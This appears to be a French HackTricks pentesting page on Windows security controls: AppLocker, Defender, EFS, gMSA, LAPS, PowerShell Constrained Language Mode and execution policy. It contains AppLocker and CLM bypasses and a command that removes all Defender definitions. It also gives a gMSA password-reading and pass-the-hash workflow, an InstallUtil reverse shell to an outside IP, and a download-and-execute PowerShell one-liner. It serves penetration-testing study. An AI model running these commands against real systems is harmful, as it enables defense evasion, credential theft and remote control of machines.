# Contrôles de sécurité Windows

{{#include ../../banners/hacktricks-training.md}}

## Politique AppLocker

Une whitelist d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et exécutés sur un système. L'objectif est de protéger l'environnement contre les malware nuisibles et les logiciels non approuvés qui ne correspondent pas aux besoins métier spécifiques d'une organisation.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de whitelisting d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **quelles applications et quels fichiers les utilisateurs peuvent exécuter**. Il fournit un **contrôle granulaire** sur les exécutables, scripts, fichiers d'installation Windows, DLLs, packaged apps, et packed app installers.\
Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérification

Vérifiez quels fichiers/extensions sont blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ce chemin de registre contient les configurations et les politiques appliquées par AppLocker, fournissant un moyen d'examiner l'ensemble actuel des règles appliquées sur le système :

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Utile **Writable folders** to bypass AppLocker Policy : si AppLocker permet d'exécuter n'importe quoi dans `C:\Windows\System32` ou `C:\Windows`, il existe des **writable folders** que vous pouvez utiliser pour **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Des binaires [**"LOLBAS's"**](https://lolbas-project.github.io/) souvent **fiables** peuvent aussi être utiles pour contourner AppLocker.
- **Des règles mal écrites peuvent aussi être contournées**
- Par exemple, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
- Les organisations se concentrent souvent sur **le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **L'application stricte des DLL est très rarement activée** en raison de la charge supplémentaire que cela peut imposer au système, et de la quantité de tests nécessaires pour s'assurer que rien ne casse. Ainsi, utiliser des **DLLs comme portes dérobées aidera à contourner AppLocker**.
- Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner AppLocker. Pour plus d'infos, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Stockage des identifiants

### Security Accounts Manager (SAM)

Les identifiants locaux sont présents dans ce fichier, les mots de passe y sont hachés.

### Local Security Authority (LSA) - LSASS

Les **identifiants** (hachés) sont **stockés** dans la **mémoire** de ce sous-système pour des raisons d'authentification unique (Single Sign-On).\
**LSA** gère la **politique de sécurité locale** (politique de mots de passe, permissions des utilisateurs...), **l'authentification**, **les jetons d'accès**...\  
Le LSA sera celui qui **vérifiera** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et **communicera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.

Les **identifiants** sont **stockés** dans le **processus LSASS** : tickets Kerberos, hashes NT et LM, mots de passe facilement décryptés.

### LSA secrets

Le LSA peut enregistrer sur disque certains identifiants :

- Mot de passe du compte ordinateur de l'Active Directory (contrôleur de domaine inaccessible).
- Mots de passe des comptes des services Windows
- Mots de passe des tâches planifiées
- Plus (mot de passe des applications IIS...)

### NTDS.dit

C'est la base de données de l'Active Directory. Elle n'est présente que sur les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) est un antivirus disponible dans Windows 10 et Windows 11, et dans certaines versions de Windows Server. Il **bloque** des outils de pentesting courants tels que **`WinPEAS`**. Cependant, il existe des moyens de **contourner ces protections**.

### Check

Pour vérifier le **statut** de **Defender** vous pouvez exécuter le cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir si c'est actif) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Pour l'énumérer, vous pouvez aussi exécuter :
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Système de fichiers chiffré (EFS)

EFS sécurise les fichiers via le chiffrement en utilisant une **clé symétrique** appelée **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans le flux de données alternatif $EFS du fichier chiffré. Lorsqu'une décryption est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur est utilisée pour déchiffrer le FEK depuis le flux $EFS. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scénarios de déchiffrement sans action de l'utilisateur** incluent :

- Lorsqu'un fichier ou dossier est déplacé vers un système de fichiers non-EFS, comme [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), il est automatiquement déchiffré.
- Les fichiers chiffrés envoyés sur le réseau via le protocole SMB/CIFS sont déchiffrés avant la transmission.

Cette méthode de chiffrement permet un **accès transparent** aux fichiers chiffrés pour le propriétaire. Cependant, changer simplement le mot de passe du propriétaire et se reconnecter ne permet pas de déchiffrer.

Points clés :

- EFS utilise une FEK symétrique, chiffrée avec la clé publique de l'utilisateur.
- Le déchiffrement utilise la clé privée de l'utilisateur pour accéder au FEK.
- Un déchiffrement automatique se produit dans des conditions spécifiques, comme la copie vers FAT32 ou la transmission réseau.
- Les fichiers chiffrés sont accessibles au propriétaire sans étapes supplémentaires.

### Vérifier les infos EFS

Vérifier si un **utilisateur** a **utilisé** ce **service** en vérifiant si ce chemin existe : `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Vérifier **qui** a **accès** au fichier en utilisant cipher /c \<file\>  
You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files

### Déchiffrement des fichiers EFS

#### Obtenir le compte SYSTEM

Cette méthode requiert que l'**utilisateur victime** ait un **processus** en cours d'exécution sur l'hôte. Si c'est le cas, en utilisant une session `meterpreter` vous pouvez vous faire passer pour le token du processus de l'utilisateur (`impersonate_token` depuis `incognito`). Ou vous pouvez simplement `migrate` vers le processus de l'utilisateur.

#### Connaître le mot de passe de l'utilisateur


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft a développé les **Group Managed Service Accounts (gMSA)** pour simplifier la gestion des comptes de service dans les infrastructures IT. Contrairement aux comptes de service traditionnels qui ont souvent l'option "**Password never expire**" activée, les gMSA offrent une solution plus sécurisée et plus facile à gérer :

- **Gestion automatique des mots de passe** : les gMSA utilisent un mot de passe complexe de 240 caractères qui change automatiquement selon la politique de domaine ou d'ordinateur. Ce processus est géré par le Key Distribution Service (KDC) de Microsoft, éliminant le besoin de mises à jour manuelles du mot de passe.
- **Sécurité renforcée** : ces comptes sont immunisés contre les lockouts et ne peuvent pas être utilisés pour des connexions interactives, renforçant ainsi leur sécurité.
- **Support multi-hôte** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour des services exécutés sur plusieurs serveurs.
- **Possibilité pour les tâches planifiées** : contrairement aux managed service accounts, les gMSA supportent l'exécution de tâches planifiées.
- **Gestion simplifiée des SPN** : le système met automatiquement à jour le Service Principal Name (SPN) lorsqu'il y a des changements dans les attributs sAMaccount de l'ordinateur ou le nom DNS, simplifiant la gestion des SPN.

Les mots de passe des gMSA sont stockés dans la propriété LDAP _**msDS-ManagedPassword**_ et sont automatiquement réinitialisés tous les 30 jours par les Domain Controllers (DCs). Ce mot de passe, un blob de données chiffrées connu sous le nom [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), ne peut être récupéré que par des administrateurs autorisés et les serveurs sur lesquels les gMSA sont installés, garantissant un environnement sécurisé. Pour accéder à cette information, une connexion sécurisée telle que LDAPS est requise, ou la connexion doit être authentifiée avec 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Consultez également cette [web page](https://cube0x0.github.io/Relaying-for-gMSA/) pour savoir comment effectuer un **NTLM relay attack** pour **read** le **password** de **gMSA**.

### Abuser du ACL chaining pour read gMSA managed password (GenericAll -> ReadGMSAPassword)

Dans de nombreux environnements, des utilisateurs à faibles privilèges peuvent pivoter vers les secrets gMSA sans compromettre le DC en abusant d'ACL d'objet mal configurées :

- Un groupe que vous pouvez contrôler (par ex., via GenericAll/GenericWrite) se voit accorder `ReadGMSAPassword` sur un gMSA.
- En vous ajoutant à ce groupe, vous héritez du droit de read le blob `msDS-ManagedPassword` du gMSA via LDAP et d'en dériver des NTLM credentials utilisables.

Typical workflow:

1) Discover the path with BloodHound and mark your foothold principals as Owned. Look for edges like:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Add yourself to the intermediate group you control (example with bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lire le mot de passe gMSA géré via LDAP et en déduire le hash NTLM. NetExec automatise l'extraction de `msDS-ManagedPassword` et la conversion en NTLM :
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) S'authentifier en tant que gMSA en utilisant le NTLM hash (aucun plaintext nécessaire). Si le compte est dans Remote Management Users, WinRM fonctionnera directement :
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Remarques:
- Les lectures LDAP de `msDS-ManagedPassword` nécessitent un sealing (p. ex., LDAPS/sign+seal). Les outils gèrent cela automatiquement.
- Les gMSAs se voient souvent accorder des droits locaux comme WinRM ; validez l'appartenance aux groupes (p. ex. : Remote Management Users) pour planifier lateral movement.
- Si vous avez seulement besoin du blob pour calculer le NTLM vous-même, voir la structure MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **restreint fortement de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, comme le blocage des COM objects, n'autorisant que les .NET types approuvés, les XAML-based workflows, les PowerShell classes, et plus encore.

### **Vérifier**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Dans les versions actuelles de Windows ce bypass ne fonctionnera pas mais vous pouvez utiliser[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez peut-être** **pour** _**Ajouter une référence**_ -> _Parcourir_ -> _Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **changer le projet en .Net4.5**.

#### Bypass direct:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **execute Powershell** code dans n'importe quel processus et bypass the constrained mode. Pour plus d'infos, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution Policy

Par défaut, il est défini sur **restricted.** Principales façons de bypass this policy:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface Security Support Provider (SSPI)

C'est l'API qui peut être utilisée pour authentifier les utilisateurs.

Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui veulent communiquer. La méthode privilégiée pour cela est Kerberos. Ensuite, le SSPI négociera quel protocole d'authentification sera utilisé ; ces protocoles d'authentification sont appelés Security Support Provider (SSP), se trouvent sur chaque machine Windows sous forme de DLL et les deux machines doivent prendre en charge le même SSP pour pouvoir communiquer.

### Principaux SSP

- **Kerberos**: Le préféré
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** et **NTLMv2**: Pour des raisons de compatibilité
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serveurs web et LDAP, mot de passe sous forme d'un hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL et TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant le protocole par défaut)
- %windir%\Windows\System32\lsasrv.dll

#### La négociation peut proposer plusieurs méthodes ou une seule.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui affiche une **invite de consentement pour les actions nécessitant des privilèges élevés**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Références

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
